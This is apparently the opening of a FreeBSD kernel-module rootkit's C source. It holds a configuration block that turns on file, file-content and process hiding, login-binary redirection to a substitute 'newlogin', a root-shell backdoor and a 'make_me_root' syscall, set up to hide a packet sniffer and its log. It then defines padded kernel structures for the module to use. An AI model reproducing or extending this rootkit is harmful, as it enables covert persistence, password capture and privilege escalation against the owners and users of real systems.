/*****WHAT DO YOU NEED?*****/
#define FILE_HIDE
#define HIDE
#define FILE_HIDE_CONTENTS
#define PROC_HIDE
#define EXEC_REDIRECTION
#define ROOTSHELL_BACKDOOR
#define SECURE_MODE

/*****PLEASE CHANGE THE FOLLOWING ITEMS*****/
#define FILE_TO_HIDE "sniffer"
#define FILE_TO_HIDE_CONTENTS "sniffer.log" 
#define FILE_TO_HIDE_CONTENTS_CODE 007
#define PROC_TO_HIDE "sniffer"
#define BIN_OLD "/usr/bin/login"
#define BIN_NEW "/usr/bin/newlogin"
#define SECURE_DIRECTORY ".thc"


/*****DEFINITIONS ETC.*****/
MALLOC_DEFINE(M_DIRP2, "dirp2", "struct");
typedef TAILQ_HEAD(, module) modulelist_t;


/*****GLOBAL VARIABLES*****/
uid_t access_uid=-1;
int global_counter;

/*****SYSTEM CALL STRUCTURES*****/
struct check_code_args {
 int code;
};
struct make_me_root_args {
 int p_pid;
};

/*****EXTERN STUFF*****/
extern struct lock lock;
extern linker_file_list_t files;
extern int next_file_id;
extern modulelist_t modules;
extern  int nextid;

/*****STRUCTRURES ETC*****/
struct module {
 TAILQ_ENTRY(module) link;
 TAILQ_ENTRY(module) flink;
 struct linker_file *file;
 int refs;
 int id;
 char *name;
 modeventhand_t handler;
 void *arg;
 modspecific_t data;
};

struct vmspace {
/*	struct vm_map vm_map;	 VM address map */
        char pad1[100];
/*	struct pmap vm_pmap;	 private physical map */
        char pad2[36];
	int vm_refcnt;		/* number of references */
	caddr_t vm_shm;		/* SYS5 shared memory private data XXX */
/* we copy from vm_startcopy to the end of the structure on fork */
#define vm_startcopy vm_rssize
	segsz_t vm_rssize;	/* current resident set size in pages */
	segsz_t vm_swrss;	/* resident set size before last swap */
	segsz_t vm_tsize;	/* text size (pages) XXX */
	segsz_t vm_dsize;	/* data size (pages) XXX */
	segsz_t vm_ssize;	/* stack size (pages) */
	caddr_t vm_taddr;	/* user virtual address of text XXX */
	caddr_t vm_daddr;	/* user virtual address of data XXX */
	caddr_t vm_maxsaddr;	/* user VA at max stack growth */
	caddr_t vm_minsaddr;	/* user VA at max stack growth */
};

struct kinfo_proc {
	struct	proc kp_proc;			/* proc structure */
	struct	eproc {
		struct	proc *e_paddr;		/* address of proc */
		struct	session *e_sess;	/* session pointer */
		struct	pcred e_pcred;		/* process credentials */
		struct	ucred e_ucred;		/* current credentials */
		struct  procsig e_procsig;	/* shared signal structure */
                /*PADDING stuff*/
		/*struct	vmspace e_vm;		 address space */
		char pad1[180];
                pid_t	e_ppid;			/* parent process id */
		pid_t	e_pgid;			/* process group id */
		short	e_jobc;			/* job control counter */
		dev_t	e_tdev;			/* controlling tty dev */
		pid_t	e_tpgid;		/* tty process group id */
		struct	session *e_tsess;	/* tty session pointer */
#define	WMESGLEN	7
		char	e_wmesg[WMESGLEN+1];	/* wchan message */
		segsz_t e_xsize;		/* text size */
		short	e_xrssize;		/* text rss */
		short	e_xccount;		/* text references */
		short	e_xswrss;
		long	e_flag;
#define	EPROC_CTTY	0x01	/* controlling tty vnode active */
#define	EPROC_SLEADER	0x02	/* session leader */
		char	e_login[roundup(MAXLOGNAME, sizeof(long))];	/* setlogin() name */
		long	e_spare[2];
	} kp_eproc;
};


